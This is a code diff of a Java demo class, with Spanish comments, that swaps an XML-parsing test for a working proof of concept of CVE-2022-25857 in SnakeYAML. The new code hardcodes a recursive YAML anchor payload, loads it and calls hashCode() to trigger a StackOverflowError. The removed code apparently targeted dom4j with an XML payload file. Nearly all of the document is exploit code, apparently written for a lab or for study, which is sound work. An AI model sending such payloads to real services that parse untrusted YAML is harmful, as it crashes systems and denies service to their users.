@@ -1,24 +1,37 @@
 package com.example;
 
 
-import org.dom4j.io.SAXReader;
+import org.yaml.snakeyaml.Yaml;
 
 public class VulnerableApp {
 
     public static void main(String[] args) {
-        String fileName = "payload.xml";
+        System.out.println("[+] Demostración de CVE-2022-25857 (SnakeYAML DoS) con payload interno.");
+
+        // 1. El payload malicioso se declara directamente como un String.
+        //    Fíjate en cómo las comillas dobles dentro del String se escapan con \".
+        String recursiveYamlPayload = "&a [ \"lol\", *a ]";
+        
+        System.out.println("[+] Usando payload hardcodeado: " + recursiveYamlPayload);
 
         try {
-            SAXReader reader = new SAXReader();
-           
-            reader.read(fileName);
+            Yaml yaml = new Yaml();
+            
+            // 2. Se llama a la versión de `load()` que acepta un String.
+            Object data = yaml.load(recursiveYamlPayload);
 
-            System.out.println("[+] El fichero XML fue parseado con éxito (esto no debería ocurrir con el payload).");
+            System.out.println("[+] Payload cargado en memoria. Detonando con .hashCode()...");
+            
+            // 3. Se llama a .hashCode() para forzar la recursión infinita.
+            //    Esto provocará el StackOverflowError.
+            data.hashCode();
+            
+            System.out.println("[+] Éxito (No deberías ver este mensaje).");
 
-        } catch (Exception e) {
-            System.err.println("[!] Ocurrió un error al parsear el XML.");
-            // La aplicación probablemente crasheará con un OutOfMemoryError antes de llegar aquí.
-            e.printStackTrace();
+        } catch (Throwable t) {
+            // Capturamos Throwable para asegurarnos de atrapar el StackOverflowError.
+            System.err.println("\n[!] La vulnerabilidad fue detonada exitosamente. Resultado:");
+            t.printStackTrace();
         }
     }
 }
